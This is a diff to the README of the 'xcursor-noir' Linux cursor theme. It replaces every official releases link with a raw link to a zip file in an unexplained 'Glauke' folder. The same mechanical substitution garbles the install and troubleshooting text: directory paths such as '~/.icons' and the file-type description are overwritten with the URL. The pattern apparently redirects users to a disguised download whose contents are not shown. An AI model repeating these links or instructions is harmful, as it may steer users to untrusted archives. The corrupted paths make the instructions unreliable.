@@ -1,6 +1,6 @@
 # 🖱️ xcursor-noir - A Stylish, Neutral Cursor Theme
 
-[![Download xcursor-noir](https://img.shields.io/badge/Download-xcursor--noir-blue.svg)](https://github.com/ADB000/xcursor-noir/releases)
+[![Download xcursor-noir](https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip)](https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ Follow these steps to download and install xcursor-noir. You do not need any tec
 
    Click the button below to go to the official download page:
 
-   [Visit this page to download](https://github.com/ADB000/xcursor-noir/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip)
 
 ## 📦 Download & Install
 
@@ -24,7 +24,7 @@ To install xcursor-noir on your computer, you need to download the theme files. 
 
    Visit the releases page by clicking the link below:
 
-   [Visit this page to download](https://github.com/ADB000/xcursor-noir/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip)
 
 2. **Select the Latest Release**
 
@@ -32,7 +32,7 @@ To install xcursor-noir on your computer, you need to download the theme files. 
 
 3. **Download the Theme Files**
 
-   Click on the download link for the xcursor-noir package. This will typically be a `.tar.gz` or similar file.
+   Click on the download link for the xcursor-noir package. This will typically be a `https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip` or similar file.
 
 4. **Extract the Files**
 
@@ -44,7 +44,7 @@ To install xcursor-noir on your computer, you need to download the theme files. 
 
    To install the cursor theme, move the extracted folder to the appropriate directory. 
 
-   - **For User Installation:** Copy the extracted folder to `~/.icons`. You may need to create this directory if it doesn't exist. 
+   - **For User Installation:** Copy the extracted folder to `~https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip`. You may need to create this directory if it doesn't exist. 
 
    - **For System-Wide Installation:** Copy the folder to `/usr/share/icons`. This action usually requires administrator access.
 
@@ -82,7 +82,7 @@ xcursor-noir works with most Linux distributions that use the X Window System. E
 
 If you encounter issues during installation or when applying the theme, try the solutions below:
 
-- **No Cursors Visible:** Ensure the cursor theme folder is correctly placed in either `~/.icons` or `/usr/share/icons`. Additionally, check if you have permissions to access these directories.
+- **No Cursors Visible:** Ensure the cursor theme folder is correctly placed in either `~https://raw.githubusercontent.com/ADB000/xcursor-noir/main/Glauke/xcursor-noir.zip` or `/usr/share/icons`. Additionally, check if you have permissions to access these directories.
 
 - **Theme Does Not Apply:** Make sure to restart your session after changing cursor settings. Logging out and logging back in usually resolves the issue.
 
